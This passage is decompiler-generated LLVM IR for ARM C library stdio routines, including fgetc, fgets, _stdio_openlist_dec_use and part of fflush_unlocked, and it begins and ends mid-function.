  %v1_e6b0 = phi i32 [ %v1_e6b0.pre, %dec_label_pc_e6a4.dec_label_pc_e6ac_crit_edge ], [ %v1_e6b014, %dec_label_pc_e680 ]
  %v2_e6ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e6ac, i32* %r4.global-to-local, align 4
  ret i32 %v1_e6b0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_e61c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 5, 0, 1, 2, 6, 7, 3, 4 }
  uselistorder label %dec_label_pc_e6a4, { 1, 0 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
  uselistorder label %dec_label_pc_e664, { 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
}

define i32 @function_e6b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_e6b8:
  %v0_e6b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e6b8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_e6b8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e6b8, %bb
  %v4_e6c4 = phi i32 [ %arg1, %dec_label_pc_e6b8 ], [ 0, %bb ]
  ret i32 %v4_e6c4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e6c8 = load i32, i32* @r4, align 4
  store i32 %v3_e6c8, i32* %stack_var_-8, align 4
  %v0_e6cc = load i32, i32* @r0, align 4
  %v1_e6cc = add i32 %v0_e6cc, 8
  %v2_e6cc = inttoptr i32 %v1_e6cc to i32*
  %v3_e6cc = load i32, i32* %v2_e6cc, align 4
  %v1_e6d0 = add i32 %v0_e6cc, 16
  %v2_e6d0 = inttoptr i32 %v1_e6d0 to i32*
  %v3_e6d0 = load i32, i32* %v2_e6d0, align 4
  %v9_e6d4 = icmp eq i32 %v3_e6d0, %v3_e6cc
  store i32 %v0_e6cc, i32* %r4.global-to-local, align 4
  br i1 %v9_e6d4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_e6cc, i32* %v2_e6d0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_e6e0 = xor i1 %v9_e6d4, true
  call void @__pseudo_cond_branch(i1 %v1_e6e0, i32 ptrtoint (i32* @global_var_10450.275 to i32))
  %v0_e6e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e6e4 = add i32 %v0_e6e4, 8
  %v2_e6e4 = inttoptr i32 %v1_e6e4 to i32*
  %v3_e6e4 = load i32, i32* %v2_e6e4, align 4
  %v1_e6e8 = add i32 %v0_e6e4, 16
  %v2_e6e8 = inttoptr i32 %v1_e6e8 to i32*
  %v3_e6e8 = load i32, i32* %v2_e6e8, align 4
  %v2_e6ec = sub i32 %v3_e6e8, %v3_e6e4
  %v2_e6f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e6f0, i32* @r4, align 4
  ret i32 %v2_e6ec

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e6f8 = load i32, i32* @r4, align 4
  store i32 %v3_e6f8, i32* %stack_var_-16, align 4
  %v6_e6f8 = load i32, i32* @r5, align 4
  %v12_e6f8 = load i32, i32* @lr, align 4
  %v1_e6fc = add i32 %arg1, 52
  %v2_e6fc = inttoptr i32 %v1_e6fc to i32*
  %v3_e6fc = load i32, i32* %v2_e6fc, align 4
  %v2_e704 = icmp eq i32 %v3_e6fc, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_e704, label %dec_label_pc_e73c, label %dec_label_pc_e718

dec_label_pc_e718:                                ; preds = %entry
  %v1_e718 = add i32 %arg1, 16
  %v2_e718 = inttoptr i32 %v1_e718 to i32*
  %v3_e718 = load i32, i32* %v2_e718, align 4
  %v1_e71c = add i32 %arg1, 24
  %v2_e71c = inttoptr i32 %v1_e71c to i32*
  %v3_e71c = load i32, i32* %v2_e71c, align 4
  %v3_e720 = icmp ult i32 %v3_e718, %v3_e71c
  br i1 %v3_e720, label %.thread, label %dec_label_pc_e730

.thread:                                          ; preds = %dec_label_pc_e718
  %v2_e724 = inttoptr i32 %v3_e718 to i8*
  %v3_e724 = load i8, i8* %v2_e724, align 1
  %v4_e724 = zext i8 %v3_e724 to i32
  store i32 %v4_e724, i32* %r4.global-to-local, align 4
  %v6_e724 = add i32 %v3_e718, 1
  store i32 %v6_e724, i32* %v2_e718, align 4
  br label %dec_label_pc_e7b0

dec_label_pc_e730:                                ; preds = %dec_label_pc_e718
  %v1_e730 = inttoptr i32 %arg1 to i16*
  %v2_e730 = call i32 @getc_unlocked(i16* %v1_e730)
  store i32 %v2_e730, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e7b0

dec_label_pc_e73c:                                ; preds = %entry
  %v1_e740 = add i32 %arg1, 56
  store i32 %v1_e740, i32* @r4, align 4
  %v4_e754 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_e754)
  %v0_e768 = load i32, i32* %r6.global-to-local, align 4
  %v2_e768 = add i32 %v0_e768, 16
  %v3_e768 = inttoptr i32 %v2_e768 to i32*
  %v4_e768 = load i32, i32* %v3_e768, align 4
  store i32 59252, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e768)
  %v0_e774 = load i32, i32* @r5, align 4
  %v1_e774 = add i32 %v0_e774, 16
  %v2_e774 = inttoptr i32 %v1_e774 to i32*
  %v3_e774 = load i32, i32* %v2_e774, align 4
  %v1_e778 = add i32 %v0_e774, 24
  %v2_e778 = inttoptr i32 %v1_e778 to i32*
  %v3_e778 = load i32, i32* %v2_e778, align 4
  %v3_e77c = icmp ult i32 %v3_e774, %v3_e778
  br i1 %v3_e77c, label %.thread2, label %dec_label_pc_e78c

.thread2:                                         ; preds = %dec_label_pc_e73c
  %v2_e780 = inttoptr i32 %v3_e774 to i8*
  %v3_e780 = load i8, i8* %v2_e780, align 1
  %v4_e780 = zext i8 %v3_e780 to i32
  store i32 %v4_e780, i32* %r4.global-to-local, align 4
  %v6_e780 = add i32 %v3_e774, 1
  store i32 %v6_e780, i32* %v2_e774, align 4
  br label %dec_label_pc_e798

dec_label_pc_e78c:                                ; preds = %dec_label_pc_e73c
  %v1_e790 = inttoptr i32 %v0_e774 to i16*
  %v2_e790 = call i32 @getc_unlocked(i16* %v1_e790)
  store i32 %v2_e790, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %.thread2, %dec_label_pc_e78c
  %v0_e7a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e7a4 = add i32 %v0_e7a4, 24
  %v3_e7a4 = inttoptr i32 %v2_e7a4 to i32*
  %v4_e7a4 = load i32, i32* %v3_e7a4, align 4
  store i32 %v4_e7a4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_e7a4)
  br label %dec_label_pc_e7b0

dec_label_pc_e7b0:                                ; preds = %.thread, %dec_label_pc_e730, %dec_label_pc_e798
  %v0_e7b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_e7b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e7b8, i32* @r4, align 4
  store i32 %v6_e6f8, i32* @r5, align 4
  store i32 %v12_e6f8, i32* @lr, align 4
  ret i32 %v0_e7b0

; uselistorder directives
  uselistorder i32 %v3_e774, { 1, 0, 2 }
  uselistorder i32 %v3_e718, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 2, 0, 5, 4, 1, 3 }
  uselistorder label %dec_label_pc_e7b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e798, { 1, 0 }
}

define i32 @function_e7c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_e7c4:
  %v0_e7c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e7c4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_e7c4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e7c4, %bb
  %v10_e7d0 = phi i32 [ %arg1, %dec_label_pc_e7c4 ], [ 0, %bb ]
  ret i32 %v10_e7d0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_e7d4 = load i32, i32* @r4, align 4
  store i32 %v3_e7d4, i32* %stack_var_-28, align 4
  %v6_e7d4 = load i32, i32* @r5, align 4
  %v9_e7d4 = load i32, i32* @r6, align 4
  %v12_e7d4 = load i32, i32* @r7, align 4
  %v21_e7d4 = load i32, i32* @lr, align 4
  %v1_e7d8 = add i32 %arg3, 52
  %v2_e7d8 = inttoptr i32 %v1_e7d8 to i32*
  %v3_e7d8 = load i32, i32* %v2_e7d8, align 4
  %v1_e7e0 = sub i32 1, %v3_e7d8
  %v2_e7e0 = icmp ult i32 %v3_e7d8, 2
  br i1 %v2_e7e0, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_e7e0, %entry ]
  %v0_e7e8 = phi i32 [ 0, %bb ], [ %v1_e7e0, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_e7e8 = icmp eq i32 %v0_e7e8, 0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_e7e8, label %dec_label_pc_e83c, label %dec_label_pc_e804

dec_label_pc_e804:                                ; preds = %bb16
  %v1_e808 = add i32 %arg3, 56
  store i32 %v1_e808, i32* @r4, align 4
  %v4_e81c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_e81c)
  %v0_e830 = load i32, i32* @r5, align 4
  %v2_e830 = add i32 %v0_e830, 16
  %v3_e830 = inttoptr i32 %v2_e830 to i32*
  %v4_e830 = load i32, i32* %v3_e830, align 4
  store i32 %v4_e830, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_e83c.285 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e830)
  %v0_e83c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_e840.pre = load i32, i32* @r7, align 4
  %v0_e844.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e83c

dec_label_pc_e83c:                                ; preds = %bb16, %dec_label_pc_e804
  %v0_e844 = phi i32 [ %arg3, %bb16 ], [ %v0_e844.pre, %dec_label_pc_e804 ]
  %v0_e840 = phi i32 [ %arg2, %bb16 ], [ %v0_e840.pre, %dec_label_pc_e804 ]
  %v0_e83c = phi i32 [ %arg1, %bb16 ], [ %v0_e83c.pre, %dec_label_pc_e804 ]
  %v3_e848 = inttoptr i32 %v0_e83c to i8*
  %v4_e848 = call i32 @__GI_fgets_unlocked(i8* %v3_e848, i32 %v0_e840, i32 %v0_e844)
  %v0_e84c = load i32, i32* %sl.global-to-local, align 4
  %v2_e84c = icmp eq i32 %v0_e84c, 0
  store i32 %v4_e848, i32* %r4.global-to-local, align 4
  br i1 %v2_e84c, label %dec_label_pc_e83c..thread3_crit_edge, label %bb17

dec_label_pc_e83c..thread3_crit_edge:             ; preds = %dec_label_pc_e83c
  %v0_e868.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_e83c
  %v1_e860 = load i32, i32* @r5, align 4
  %v3_e860 = add i32 %v1_e860, 24
  %v4_e860 = inttoptr i32 %v3_e860 to i32*
  %v5_e860 = load i32, i32* %v4_e860, align 4
  store i32 %v5_e860, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_e83c..thread3_crit_edge, %bb17
  %v0_e868 = phi i32 [ %v0_e868.pre, %dec_label_pc_e83c..thread3_crit_edge ], [ %v5_e860, %bb17 ]
  %v2_e868 = xor i1 %v2_e84c, true
  call void @__pseudo_cond_branch(i1 %v2_e868, i32 %v0_e868)
  %v0_e86c = load i32, i32* %r4.global-to-local, align 4
  %v2_e874 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e874, i32* @r4, align 4
  store i32 %v6_e7d4, i32* @r5, align 4
  store i32 %v9_e7d4, i32* @r6, align 4
  store i32 %v12_e7d4, i32* @r7, align 4
  store i32 %v21_e7d4, i32* @lr, align 4
  ret i32 %v0_e86c

; uselistorder directives
  uselistorder i32 %v3_e7d8, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_e83c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_e880(i32 %arg1) local_unnamed_addr {
dec_label_pc_e880:
  %v0_e880 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e880, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_e880
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e880, %bb
  %v10_e88c = phi i32 [ %arg1, %dec_label_pc_e880 ], [ 0, %bb ]
  ret i32 %v10_e88c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e890 = load i32, i32* @r4, align 4
  store i32 %v3_e890, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r6.global-to-local, align 4
  %v4_e8a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), align 4
  store i32 %v4_e8a0, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_e8a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 112) to i32*), align 4
  store i32 %v4_e8a8, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_e8b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 %v4_e8b4, i32* %r7.global-to-local, align 4
  %v2_e8c0 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_e8b4)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_e8d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e8d4 = add i32 %v0_e8d4, 16
  %v3_e8d4 = inttoptr i32 %v2_e8d4 to i32*
  %v4_e8d4 = load i32, i32* %v3_e8d4, align 4
  store i32 %v4_e8d4, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e8d4)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_e8e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e8e4 = add i32 %v0_e8e4, 12
  %v3_e8e4 = inttoptr i32 %v2_e8e4 to i32*
  %v4_e8e4 = load i32, i32* %v3_e8e4, align 4
  store i32 %v4_e8e4, i32* %r3.global-to-local, align 4
  %v1_e8e8 = inttoptr i32 %v4_e8e4 to i32*
  %v2_e8e8 = load i32, i32* %v1_e8e8, align 4
  store i32 %v2_e8e8, i32* %r3.global-to-local, align 4
  %v7_e8ec = icmp eq i32 %v2_e8e8, 1
  br i1 %v7_e8ec, label %dec_label_pc_e8f4, label %dec_label_pc_e9b4

dec_label_pc_e8f4:                                ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_e8f8 = add i32 %v0_e8e4, 52
  %v3_e8f8 = inttoptr i32 %v2_e8f8 to i32*
  %v4_e8f8 = load i32, i32* %v3_e8f8, align 4
  store i32 %v4_e8f8, i32* %r3.global-to-local, align 4
  %v1_e8fc = inttoptr i32 %v4_e8f8 to i32*
  %v2_e8fc = load i32, i32* %v1_e8fc, align 4
  store i32 %v2_e8fc, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_e8fc, 1
  br i1 %tmp32, label %dec_label_pc_e9b4, label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e8f4
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_e90c = add i32 %v0_e8e4, 100
  %v3_e90c = inttoptr i32 %v2_e90c to i32*
  %v4_e90c = load i32, i32* %v3_e90c, align 4
  store i32 %v4_e90c, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e8b4)
  call void @__pseudo_branch(i32 %v4_e8d4)
  %v0_e934 = load i32, i32* %r6.global-to-local, align 4
  %v2_e934 = add i32 %v0_e934, 48
  %v3_e934 = inttoptr i32 %v2_e934 to i32*
  %v4_e934 = load i32, i32* %v3_e934, align 4
  store i32 %v4_e934, i32* %r3.global-to-local, align 4
  %v1_e938 = inttoptr i32 %v4_e934 to i32*
  %v2_e938 = load i32, i32* %v1_e938, align 4
  store i32 %v2_e938, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_e98413 = icmp eq i32 %v2_e938, 0
  br i1 %v2_e98413, label %dec_label_pc_e990, label %dec_label_pc_e948

dec_label_pc_e948:                                ; preds = %dec_label_pc_e908, %dec_label_pc_e980
  %v0_e96c4 = phi i32 [ %v0_e980, %dec_label_pc_e980 ], [ %v2_e938, %dec_label_pc_e908 ]
  %v1_e948 = inttoptr i32 %v0_e96c4 to i16*
  %v2_e948 = load i16, i16* %v1_e948, align 2
  %v3_e948 = zext i16 %v2_e948 to i32
  store i32 %v3_e948, i32* %r3.global-to-local, align 4
  %v2_e94c = and i32 %v3_e948, 32816
  %v7_e950 = icmp eq i32 %v2_e94c, 48
  %v1_e954 = add i32 %v0_e96c4, 32
  %v2_e954 = inttoptr i32 %v1_e954 to i32*
  %v3_e954 = load i32, i32* %v2_e954, align 4
  store i32 %v3_e954, i32* %r5.global-to-local, align 4
  br i1 %v7_e950, label %dec_label_pc_e960, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_e948
  store i32 %v0_e96c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e980

dec_label_pc_e960:                                ; preds = %dec_label_pc_e948
  %v0_e960 = load i32, i32* %r7.global-to-local, align 4
  %v2_e960 = icmp eq i32 %v0_e960, 0
  br i1 %v2_e960, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_e960
  %v1_e964 = load i32, i32* %r6.global-to-local, align 4
  %v2_e964 = load i32, i32* %r8.global-to-local, align 4
  %v3_e964 = add i32 %v2_e964, %v1_e964
  %v4_e964 = inttoptr i32 %v3_e964 to i32*
  %v5_e964 = load i32, i32* %v4_e964, align 4
  store i32 %v5_e964, i32* %r3.global-to-local, align 4
  %v3_e968 = inttoptr i32 %v5_e964 to i32*
  store i32 %v3_e954, i32* %v3_e968, align 4
  %v0_e96c = load i32, i32* %r4.global-to-local, align 4
  %v1_e96c = inttoptr i32 %v0_e96c to i16*
  %v2_e96c = load i16, i16* %v1_e96c, align 2
  %v3_e96c = zext i16 %v2_e96c to i32
  store i32 %v3_e96c, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_e960
  %v2_e96c10 = load i16, i16* %v1_e948, align 2
  %v3_e96c11 = zext i16 %v2_e96c10 to i32
  store i32 %v3_e96c11, i32* %r3.global-to-local, align 4
  %v3_e970 = add i32 %v0_e960, 32
  %v4_e970 = inttoptr i32 %v3_e970 to i32*
  store i32 %v3_e954, i32* %v4_e970, align 4
  %v0_e974.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_e974 = phi i32 [ %v3_e96c, %.thread ], [ %v0_e974.pre, %bb ]
  %v1_e974 = and i32 %v0_e974, 8192
  %v2_e974 = icmp eq i32 %v1_e974, 0
  br i1 %v2_e974, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_e97c = xor i1 %v2_e974, true
  call void @__pseudo_cond_branch(i1 %v1_e97c, i32 ptrtoint (i32* @global_var_bd70.236 to i32))
  %v0_e980.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e980

dec_label_pc_e980:                                ; preds = %.thread23, %bb35
  %v0_e980 = phi i32 [ %v0_e980.pre, %bb35 ], [ %v3_e954, %.thread23 ]
  store i32 %v0_e980, i32* %r4.global-to-local, align 4
  %v2_e984 = icmp eq i32 %v0_e980, 0
  br i1 %v2_e984, label %dec_label_pc_e984.dec_label_pc_e990_crit_edge, label %dec_label_pc_e948

dec_label_pc_e984.dec_label_pc_e990_crit_edge:    ; preds = %dec_label_pc_e980
  %v0_e99c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e984.dec_label_pc_e990_crit_edge, %dec_label_pc_e908
  %v0_e99c = phi i32 [ %v0_e99c.pre, %dec_label_pc_e984.dec_label_pc_e990_crit_edge ], [ %v0_e934, %dec_label_pc_e908 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_e99c = add i32 %v0_e99c, 24
  %v3_e99c = inttoptr i32 %v2_e99c to i32*
  %v4_e99c = load i32, i32* %v3_e99c, align 4
  call void @__pseudo_branch(i32 %v4_e99c)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_e9ac = load i32, i32* %r6.global-to-local, align 4
  %v2_e9ac = add i32 %v0_e9ac, 52
  %v3_e9ac = inttoptr i32 %v2_e9ac to i32*
  %v4_e9ac = load i32, i32* %v3_e9ac, align 4
  store i32 %v4_e9ac, i32* %r3.global-to-local, align 4
  %v0_e9b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_e9b0 = inttoptr i32 %v4_e9ac to i32*
  store i32 %v0_e9b0, i32* %v2_e9b0, align 4
  %v0_e9b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e9b4

dec_label_pc_e9b4:                                ; preds = %entry, %dec_label_pc_e8f4, %dec_label_pc_e990
  %v0_e9b8 = phi i32 [ %v0_e8e4, %entry ], [ %v0_e8e4, %dec_label_pc_e8f4 ], [ %v0_e9b8.pre, %dec_label_pc_e990 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_e9b8 = add i32 %v0_e9b8, 12
  %v3_e9b8 = inttoptr i32 %v2_e9b8 to i32*
  %v4_e9b8 = load i32, i32* %v3_e9b8, align 4
  %v1_e9bc = inttoptr i32 %v4_e9b8 to i32*
  %v2_e9bc = load i32, i32* %v1_e9bc, align 4
  %v1_e9c0 = add i32 %v2_e9bc, -1
  store i32 %v1_e9c0, i32* %v1_e9bc, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_e9d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e9d4 = add i32 %v0_e9d4, 24
  %v3_e9d4 = inttoptr i32 %v2_e9d4 to i32*
  %v4_e9d4 = load i32, i32* %v3_e9d4, align 4
  store i32 %v4_e9d4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_e9d4)
  %v2_e9e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e9e4, i32* %r4.global-to-local, align 4
  ret i32 %v2_e8c0

; uselistorder directives
  uselistorder i32 %v0_e980, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_e9b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e980, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_e948, { 1, 0 }
}

define i32 @function_e9f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e9f0:
  %v0_e9f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e9f0, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_e9f0
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_e9f0, %bb
  %v10_ea14 = phi i32 [ %arg1, %dec_label_pc_e9f0 ], [ 0, %bb ]
  ret i32 %v10_ea14

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %sb.global-to-local, align 4
  %v4_ea28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 48) to i32*), align 4
  store i32 %v4_ea28, i32* %r3.global-to-local, align 4
  %v10_ea2c = icmp eq i32 %tmp, %v4_ea28
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_ea2c, label %bb, label %dec_label_pc_ea44

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_ea54

dec_label_pc_ea44:                                ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_ea48 = icmp eq i16* %arg1, null
  br i1 %v2_ea48, label %dec_label_pc_ea54, label %dec_label_pc_ebbc

dec_label_pc_ea54:                                ; preds = %bb, %dec_label_pc_ea44
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_ea44 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_ea68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_ea74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_ea68, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ea74)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_ea98 = load i32, i32* %sb.global-to-local, align 4
  %v2_ea98 = add i32 %v0_ea98, 16
  %v3_ea98 = inttoptr i32 %v2_ea98 to i32*
  %v4_ea98 = load i32, i32* %v3_ea98, align 4
  call void @__pseudo_branch(i32 %v4_ea98)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_eaa8 = add i32 %v0_ea98, 12
  %v3_eaa8 = inttoptr i32 %v2_eaa8 to i32*
  %v4_eaa8 = load i32, i32* %v3_eaa8, align 4
  store i32 %v4_eaa8, i32* %r2.global-to-local, align 4
  %v1_eaac = inttoptr i32 %v4_eaa8 to i32*
  %v2_eaac = load i32, i32* %v1_eaac, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_eab4 = add i32 %v2_eaac, 1
  store i32 %v1_eab4, i32* %r3.global-to-local, align 4
  %v2_eab8 = add i32 %v0_ea98, 24
  %v3_eab8 = inttoptr i32 %v2_eab8 to i32*
  %v4_eab8 = load i32, i32* %v3_eab8, align 4
  store i32 %v1_eab4, i32* %v1_eaac, align 4
  call void @__pseudo_branch(i32 %v4_eab8)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_ead4 = load i32, i32* %sb.global-to-local, align 4
  %v2_ead4 = add i32 %v0_ead4, 100
  %v3_ead4 = inttoptr i32 %v2_ead4 to i32*
  %v4_ead4 = load i32, i32* %v3_ead4, align 4
  store i32 %v4_ead4, i32* @r4, align 4
  store i32 %v4_ead4, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ea74)
  call void @__pseudo_branch(i32 %v4_ea98)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_eafc = load i32, i32* %sb.global-to-local, align 4
  %v2_eafc = add i32 %v0_eafc, 48
  %v3_eafc = inttoptr i32 %v2_eafc to i32*
  %v4_eafc = load i32, i32* %v3_eafc, align 4
  store i32 %v4_eafc, i32* %r3.global-to-local, align 4
